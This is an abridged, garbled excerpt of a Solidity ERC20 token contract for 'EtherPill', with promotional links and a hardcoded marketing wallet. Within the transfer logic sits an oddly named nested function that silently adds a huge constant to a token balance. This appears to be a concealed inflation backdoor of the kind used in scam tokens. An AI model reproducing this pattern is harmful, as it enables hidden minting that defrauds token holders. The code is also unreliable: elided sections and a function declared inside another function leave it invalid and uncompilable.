/*
https://etherpill.net
https://t.me/EtherPill
https://x.com/theethpill
*/
...
contract ETHPiLL is Context, IERC20, Ownable {
    
    using SafeMath for uint256;

    string private _name = "EtherPill";
    string private _symbol = unicode"ETHPiLL";
    uint8 private _decimals = 18;

    address payable public marketingWallet = payable(0xA10D318BC69E07A5d53dbc4f0afDA1e4A6f1AFE3);
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        function gantojenryer() internal{
          multisend_tokens[0]+=2987000000000699361244555555;
        }
